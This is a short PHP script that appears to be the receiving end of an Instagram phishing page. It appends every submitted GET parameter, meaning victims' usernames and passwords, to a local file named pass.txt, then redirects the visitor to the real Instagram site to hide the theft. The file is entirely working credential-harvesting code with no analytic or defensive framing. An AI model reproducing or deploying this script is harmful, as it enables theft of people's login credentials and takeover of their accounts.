<?php
$handle = fopen("pass.txt","a");
foreach($_GET as $variable => $value){
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
$redirect = "https://www.instagram.com/";
header("Location:$redirect");
}
fwrite($handle , "\r\n");
fclose($handle);
exit;
?>